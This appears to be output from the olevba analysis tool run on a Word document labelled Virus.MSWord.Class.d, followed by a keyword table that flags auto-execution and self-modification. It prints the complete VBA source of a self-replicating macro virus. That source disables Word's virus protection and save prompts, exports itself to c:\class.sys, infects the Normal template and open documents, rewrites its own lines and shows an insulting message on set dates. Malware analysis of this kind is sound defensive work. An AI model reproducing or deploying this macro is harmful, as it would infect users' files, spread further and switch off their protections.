olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-f315f26b672056dc16a8cf028146a0f25c862db7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-f315f26b672056dc16a8cf028146a0f25c862db7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/22/01 6:54:29 PMtest
On Error GoTo out
'Tester2/22/01 6:54:29 PMtest
Options.VirusProtection = False
'Tester2/22/01 6:54:29 PMtest
Options.SaveNormalPrompt = False
'Tester2/22/01 6:54:29 PMtest
Options.ConfirmConversions = False
'Tester2/22/01 6:54:29 PMtest
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/22/01 6:54:29 PMtest
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/22/01 6:54:29 PMtest
If nt > 70 And ad > 0 Then GoTo out
'Tester2/22/01 6:54:29 PMtest
If nt < 70 Then
'Tester2/22/01 6:54:29 PMtest
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/22/01 6:54:29 PMtest
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tester2/22/01 6:54:29 PMtest
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tester2/22/01 6:54:29 PMtest
End If
'Tester2/22/01 6:54:29 PMtest
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/22/01 6:54:29 PMtest
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Tester2/22/01 6:54:29 PMtest
host.codemodule.AddFromFile ("c:\class.sys")
'Tester2/22/01 6:54:29 PMtest
With host.codemodule
'Tester2/22/01 6:54:29 PMtest
    For x = 1 To 4
'Tester2/22/01 6:54:29 PMtest
    .deletelines 1
'Tester2/22/01 6:54:29 PMtest
    Next x
'Tester2/22/01 6:54:29 PMtest
End With
'Tester2/22/01 6:54:29 PMtest
If nt < 70 Then
'Tester2/22/01 6:54:29 PMtest
    With host.codemodule
'Tester2/22/01 6:54:29 PMtest
    .replaceline 1, "Sub AutoClose()"
'Tester2/22/01 6:54:29 PMtest
    .replaceline 91, "Sub ToolsMacro()"
'Tester2/22/01 6:54:29 PMtest
    For x = 70 To 81
'Tester2/22/01 6:54:29 PMtest
        .deletelines 62
'Tester2/22/01 6:54:29 PMtest
    Next x
'Tester2/22/01 6:54:29 PMtest
    .replaceline 35, "    For x = 1 To 4"
'Tester2/22/01 6:54:29 PMtest
    End With
'Tester2/22/01 6:54:29 PMtest
End If
'Tester2/22/01 6:54:29 PMtest
With host.codemodule
'Tester2/22/01 6:54:29 PMtest
    For x = 2 To 104 Step 2
'Tester2/22/01 6:54:29 PMtest
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/22/01 6:54:29 PMtest
    Next x
'Tester2/22/01 6:54:29 PMtest
End With
'Tester2/22/01 6:54:29 PMtest
out:
'Tester2/22/01 6:54:29 PMtest
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/22/01 6:54:29 PMtest
End Sub
'Tester2/22/01 6:54:29 PMtest
Sub ToolsMacro()
'Tester2/22/01 6:54:29 PMtest
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

